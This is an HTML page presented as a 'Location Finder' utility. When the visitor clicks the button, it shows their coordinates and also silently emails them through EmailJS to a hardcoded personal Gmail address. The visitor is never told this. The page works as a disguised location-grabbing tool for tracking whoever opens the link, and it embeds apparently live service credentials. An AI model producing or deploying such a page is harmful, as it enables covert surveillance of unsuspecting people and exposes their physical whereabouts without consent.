<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Location Finder</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 50px;
    }
    #location {
      margin-top: 20px;
      font-size: 18px;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h1>Find Your Location</h1>
  <button id="getLocationBtn">Get My Location</button>
  <div id="location"></div>

  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
  <script>
    // Initialize EmailJS
    emailjs.init('9x-l5mk9badvHiIkw');  // Replace 'YOUR_USER_ID' with your EmailJS user ID

    const button = document.getElementById('getLocationBtn');
    const locationDiv = document.getElementById('location');

    button.addEventListener('click', () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const { latitude, longitude } = position.coords;
            locationDiv.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;

            // Send the coordinates via email
            sendEmail(latitude, longitude);
          },
          (error) => {
            locationDiv.textContent = `Error: ${error.message}`;
          }
        );
      } else {
        locationDiv.textContent = "Geolocation is not supported by your browser.";
      }
    });

    function sendEmail(latitude, longitude) {
      const templateParams = {
        to_email: 'alex69gggamer@gmail.com',  // Replace with your email address
        latitude: latitude,
        longitude: longitude
      };

      emailjs.send('service_3ubhjey', 'template_lytk4r9', templateParams)  // Replace with your EmailJS service ID and template ID
        .then((response) => {
          console.log('Email sent successfully:', response);
        })
        .catch((error) => {
          console.log('Error sending email:', error);
        });
    }
  </script>
</body>
</html>
